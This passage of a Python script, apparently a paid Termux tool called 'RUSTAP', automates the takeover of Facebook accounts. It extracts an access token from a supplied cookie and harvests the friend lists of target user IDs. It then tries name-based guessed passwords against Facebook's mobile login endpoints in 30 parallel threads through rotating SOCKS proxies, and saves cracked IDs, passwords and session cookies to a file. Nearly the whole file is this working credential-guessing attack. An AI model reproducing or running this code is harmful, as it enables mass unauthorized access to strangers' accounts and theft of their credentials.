  k1,k2,k3,k4=id[:4],id[3:6],id[4:9],id[9:]
  intuid=int(id.split('#')[0])
  pref=str((intuid-104729)*2-37+(1-2**7))
  suff=str((intuid-523217)%104729)
  realid=(suff+k3+k1+k4+k2+pref).encode().hex()
  try:
    httpCaht = requests.get('https://github.com/RUSTAPHUUU/Approval.txt/blob/main/Approval.txt').text
    if id in httpCaht:
      print('\33[1;32mYour Key Register is Approved')
      msg = str(os.geteuid())
      time.sleep(0.5)
      clear()
      pass
    else:
      print('Your Key : '+id)
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t WELCOME TO RUSTAP Paid TOOL \33[0;m')
      print('\33[1;32mImportant Note-Tool is Paid ')
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t Note:This Tool Best for Nepal\33[0;m')
      print('if you want to buy this tool then you need to pay')
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t Weekly 150Rs NPR\33[0;m')
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t [1] Key is only for 1 Device, You Cannot Transfer Your Subscription.\33[0;m')
      print('\33[1;37m----------------------------------------------')
      print (' \33[37;41m\t  If your subscription ends by clearing data, system update, deleting termux or downgrading and upgrading termux apk, your will not be able to get subscription untill you pay again. \33[0;m')
      print('\33[1;37m----------------------------------------------')
      input('IF YOU WANT TO BUY THE PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('https://www.facebook.com/profile.php?id=100084565670977'),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()
#--------------------[ LOGIN ]--------------#
def login123():
	os.system('clear')
	banner()
	info()
	print(""" \x1b[38;5;196m>>\x1b[37m USE DATR COOKIE """)
	linex()
	print(""" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m LOGIN USING COOKIE """)
	print(""" \x1b[38;5;196m[\x1b[37m0\x1b[38;5;196m]\x1b[37m JOIN GROUPS  """)
	linex()
	lgmt = input(' CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '0':
		groups()
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

		

def login_lagi334():
	global logincookie
	try:
		if logincookie:
		    cookie = logincookie
		else:
			linex()
			cookie = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER COOKIE : ')
		try:
			asu = random.choice([m,k,h,b,u])
			open("data/.cok.txt", "w").write(cookie)
			with requests.Session() as rsn:
				try:
					rsn.headers.update({
	                    'Accept-Language': 'id,en;q=0.9',
	                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
	                    'Referer': 'https://www.instagram.com/',
	                    'Host': 'www.facebook.com',
	                    'Sec-Fetch-Mode': 'cors',
	                    'Accept': '*/*',
						'Connection': 'keep-alive',
	                    'Sec-Fetch-Site': 'cross-site',
	                    'Sec-Fetch-Dest': 'empty',
	                    'Origin': 'https://www.instagram.com',
	                    'Accept-Encoding': 'gzip, deflate',
	                })
					response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
					if '"access_token":' in str(response.headers):
						token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
						open("data/.token.txt", "w").write(token)
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m LOGIN DONE RESTARTING !');restart()
					else:
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
				except:
					linex()
					animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
		except Exception as e:
			linex()
			animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
			os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
			time.sleep(1)
			back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id):

	try:

		token = open('data/.token.txt','r').read()

		cok = open('data/.cok.txt','r').read()

	except IOError:

		print('[×] INVIALD COOKIE ')

		time.sleep(5)

		insert_cookie()

	os.system('clear')

	banner()

	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m WELCOME     : "+uname)

	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m TODAYS DATE : "+date)
	
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m COOKIE USER    : {my_name}")
	
	print(f" \x1b[37m\x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m COOKIE USER ID : {my_id} ")

	linex()

	print(f""" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CRACK PUBLIC """)
	print(f""" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CRACK FILE         """)
#	print(f""" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHECK RESULTS      """)
#	print(f""" [\u001b[36m4\033[1;37m] CHANGE PASSWORD""")
#	print(f""" [\u001b[36m5\033[1;37m] RESET NAME""")
#	print(f""" [\u001b[36m6\033[1;37m] CONTACT ADMIN""")
	print(f""" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m LOGOUT MENU""")

	linex()

	_____anish__rustapp_____ = input(' CHOOSE : ')

	if _____anish__rustapp_____ in ['1']:

		dump_massal()

	elif _____anish__rustapp_____ in ['2']:

		crack_file()

	elif _____anish__rustapp_____ in ['3','03']:

		result()

	elif _____anish__rustapp_____ in ['4','04']:

		input

		os.system('rm -rf data/password.xml')

		linex()

		animation(' [✓] PASSWORD RESET ')

		exit()

	elif _____anish__rustapp_____ in ['5','05']:

		os.system('rm -rf data/name.xml')

		linex()

		animation(' [✓] NAME RESET ')

		exit()

	elif _____anish__rustapp_____ in ['6','06']:

		contact()

	elif _____anish__rustapp_____ in ['0']:

		os.system('rm -rf data/.token.txt')

		os.system('rm -rf .cookie.txt')

		linex()

		animation(' [✓] DONE LOGOUT ')

		exit()

	else:

		linex()

		animation(' [×] SELECT CORRECTLY ')

		back()
		
#----------CREATION-----------#
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
lin= 40* '-'


#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():

	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	try:
		linex()
		jum = int(input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID OPTION ')
		restart()
	if jum<1 or jum>100000000:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			head = (
			{"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
			})
			if len(id) == 0:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	          
			)
			else:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	           
			)
			col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL ID : \x1b[38;5;196m'+str(len(id))+'\x1b[37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()


#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			fileX = input ('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m ENTER YOUR FILE :\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mTOTAL ID : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mFILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m CLONE ONLY MIX ID')
	hu = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\033[1;92m[\033[1;36m\033[1;92m]\033[0;92mWRONG OPTION ')
		exit()
	
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m MOBILE ')
	hc = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m PASSWORD MENU: \x1b[1;94m MANUAL PASSWORD \x1b[1;91m[M]\n\x1b[1;93m AUTO PASSWORD \x1b[1;96m[A] \x1b[1;92m\n [\033[1;92m\033[1;31m\033[1;92m] CHOOSE : \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mAdd Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(RUSTAP_NAME))
	print(f' [\u001b[36m>>\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] NOTE = \33[1;92m[USE AIRPLANE MODE ON OF FOR OK IDZ] ")
	print(f'\033[1;92m---------------------------------------------------------')
	#file()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'frist123')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstlast')
					pwv.append(frs+'first@@')
					pwv.append(frs+'last123')
					pwv.append(frs+'khan123')
					pwv.append(frs+'i love you')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstslast')
					pwv.append(frs+'first123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'first last')
					pwv.append(frs+'frist')
					pwv.append(frs+'last')
					pwv.append(frs+'#@')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstslast')
					pwv.append(frs+'first123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print('\n\033[1;37m----------------------------------------------')

	print(' [\u001b[36m>>\033[1;37m] CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)

	print(' [\u001b[36m>>\033[1;37m] OK : %s '%(ok))

	print(' [\u001b[36m>>\033[1;37m] CP : %s '%(cp))

	linex()

	woi = input(' \u001b[36m>>\033[1;37m ENTER TO BACK')

	exit()

		
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [RUSTAP] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-D53N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4496.112 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', 'accept-encoding': 'gzip, deflate br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-D53N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4496.112 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', 'accept-encoding': 'gzip, deflate br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mRUSTAP-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+RUSTAP-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#print('\x1b[1;91m \x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m Ｃ\033[1;93mＹ\033[1;94mＢ\033[1;95mＥ\033[1;96mＲ\033[1;95m－\033[1;94m５\033[1;96m０\033[1;92m5\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m  ')
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mRUSTAP-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/RUSTAP-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
##############
loop = 0
cps=[]
oks=[]



#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':

	try:os.mkdir('OK')

	except:pass

	try:os.mkdir('CP')

	except:pass

	try:os.mkdir('data')

	except:pass

	try:os.system('touch .prox.txt')

	except:pass

	anish_rustapp(f'\n\t{x}——> {h}USE THIS COMMAND APPROPRIATELY\n\t{x}——> {h}IF THERE ARE BUGS/ERROR SAY YEAH\n\t{x}——> {h}OUR GROUP SAYS BE HEALTHY\n\t{x}——> {h}HOPEFULLY YOUR DAY WILL GO NICE\n\t{x}——> {h}IF U ARE GIRL THEN LUV U{x}')

	time.sleep(3)

	login()

#>>>>> WRITTEN BY<<<<<<<#
#>>>>>  💐RUSTAP💐 <<<<<#